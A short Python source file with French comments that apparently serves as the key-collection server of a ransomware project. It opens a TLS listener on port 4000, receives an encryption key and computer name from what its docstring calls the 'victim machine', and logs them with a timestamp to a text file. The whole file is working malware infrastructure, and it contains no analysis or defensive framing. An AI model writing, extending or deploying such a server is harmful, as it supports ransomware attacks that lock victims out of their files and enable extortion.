# import :
import socket, ssl
from datetime import datetime
# Variables :
host = ""
port = 4000


def storeKey(key, nom_ordi):
    """ Store la clés sur le serveur avec des informations de la machine victime
    :param key -- clé de dhiffrement:
    """
    # Variables
    fichier = "key_file.txt"
    # Ajout de la clé, du nom d'ordinateur, de l'heure et date dans le fichier
    with open(fichier, 'a+') as key_file:
        key_file.write("\n" + key + "\t" + nom_ordi + "\t" + datetime.now().strftime("%d-%m-%Y %H:%M:%S"))


# Création du socket
sock = socket.socket()
sock.bind((host, port))
sock.listen(1)

# Création et configuration du socket SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
# Certificat crée via openSSL
context.load_cert_chain(certfile="cert.pem", keyfile="cert.pem")
context.options |= ssl.PROTOCOL_TLSv1_2

# Serveur à l'écoute
while True:
    newsocket, fromaddr = sock.accept()
    sslSocket = context.wrap_socket(newsocket, server_side=True)
    # Réception de la clé et du nom de l'ordinateur
    key = sslSocket.recv().decode()
    nom_ordi = sslSocket.recv().decode()
    # Appel de la fonction "storeKey()"
    storeKey(key, nom_ordi)
